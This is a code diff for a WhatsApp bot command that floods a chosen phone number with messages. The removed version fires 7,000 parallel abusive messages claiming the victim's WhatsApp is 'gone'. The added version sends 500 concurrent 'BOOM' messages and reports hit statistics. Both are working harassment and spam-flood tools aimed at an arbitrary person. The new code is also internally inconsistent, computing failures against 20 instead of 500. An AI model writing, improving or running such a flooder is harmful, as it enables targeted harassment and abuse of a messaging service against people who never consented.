@@ -1,58 +1,77 @@
-const { channelInfo } = require('../lib/messageConfig');
-
-async function sulexhCommand(sock, chatId, message) {
-
+const { channelInfo } = require('../lib/messageConfig');  
+  
+async function sulexhCommand(sock, chatId, message) {  
     try {
-        const text =
-            message.message?.conversation ||
-            message.message?.extendedTextMessage?.text ||
-            "";
 
-        const args = text.trim().split(/\s+/);
-        const number = args[1];
+        // get command text
+        const text = message.message?.conversation || message.message?.extendedTextMessage?.text || "";
+        const args = text.split(" ");
 
-        if (!number) {
-            await sock.sendMessage(chatId, {
-                text: "Example: .sulexh 254xxxxxxxx",
-                ...channelInfo
+        // check number
+        if (!args[1]) {
+            return sock.sendMessage(chatId, {
+                text: "❌ Example: .sulexh 2547XXXXXXXX"
             }, { quoted: message });
-            return;
         }
 
-        const cleanNumber = number.replace(/[^0-9]/g, '');
-        const jid = cleanNumber + "@s.whatsapp.net";
+        // convert number to whatsapp jid
+        const target = args[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-        // ✅ Check if number exists on WhatsApp
-        const [result] = await sock.onWhatsApp(jid);
-        if (!result?.exists) {
-            await sock.sendMessage(chatId, {
-                text: "❌ Number is not on WhatsApp",
-                ...channelInfo
-            }, { quoted: message });
-            return;
-        }
+        // Create array of message promises for massive BOOM effect
+        const boomMessages = [];  
+          
+        // Prepare 500 messages for instant concurrent delivery
+        for (let i = 0; i < 500; i++) {  
 
-        // ✅ Create 20 message send promises (all at once)
-        const tasks = Array.from({ length: 7000 }, () =>
-            sock.sendMessage(jid, { text: "YOU HAVE BEEN FUCKED BY☠️☠️☠️🤖🤖 BUGBOT USING BUGFIXED SULEXH TECH POWER😭😭😭😭☠️☠️☠️☠️ YOUR WHATSAPP IS GONE KINDLY" }).catch(() => {})
-        );
-
-        // ✅ Send all messages in parallel
-        await Promise.allSettled(tasks);
-
-        // ✅ Only one confirmation message in your chat
-        await sock.sendMessage(chatId, {
-            text: "✅ *YOU HAVE SUCCESSFULLY SENT HEAVY BUG TO THE TARGET☠️☠️🤖🤖😭😭😭😢 ",
-            ...channelInfo
-        }, { quoted: message });
-
-    } catch (err) {
-        console.log("SULEXH command error:", err);
-        await sock.sendMessage(chatId, {
-            text: "⚠️ Command failed",
-            ...channelInfo
-        }, { quoted: message });
-    }
-}
-
+            const boomPromise = sock.sendMessage(target, {   
+                text: `💥 BOOM MESSAGE #${i + 1}`   
+            }).catch((error) => {  
+                console.log(`BOOM message ${i + 1} failed:`, error.message || error);  
+                return { failed: true, index: i + 1 };  
+            });  
+              
+            boomMessages.push(boomPromise);  
+        }  
+  
+        console.log("🚀 Launching 500 concurrent messages...");  
+        const launchStartTime = Date.now();  
+          
+        const boomResults = await Promise.allSettled(boomMessages);  
+          
+        const launchEndTime = Date.now();  
+        const totalLaunchTime = launchEndTime - launchStartTime;  
+  
+        const successfulHits = boomResults.filter(result =>   
+            result.status === 'fulfilled' &&   
+            result.value &&   
+            !result.value.failed  
+        ).length;  
+          
+        const failedHits = 20 - successfulHits;  
+  
+        await sock.sendMessage(chatId, {  
+            text: `💥💥💥 FLOOD BOOM COMPLETE! 💥💥💥\n` +  
+                  `📊 Statistics:\n` +  
+                  `🎯 Target: ${args[1]}\n` +
+                  `✅ Successful: ${successfulHits}/500\n` +  
+                  `❌ Failed: ${failedHits}/500\n` +  
+                  `⏱️ Total Time: ${totalLaunchTime}ms\n` +  
+                  `🚀 Concurrent Execution: TRUE\n` +  
+                  `💣 BOOM Mode: ACTIVATED`,  
+            ...channelInfo  
+        }, { quoted: message });  
+  
+        console.log(`BOOM execution completed: ${successfulHits}/20 messages sent in ${totalLaunchTime}ms`);  
+  
+    } catch (error) {  
+        console.error("Critical BOOM command error:", error);  
+  
+        await sock.sendMessage(chatId, {  
+            text: "❌💥 BOOM SYSTEM FAILURE\n" +  
+                  `Error: ${error.message || 'Unknown error occurred'}`,  
+            ...channelInfo  
+        }, { quoted: message });  
+    }  
+}  
+  
 module.exports = sulexhCommand;
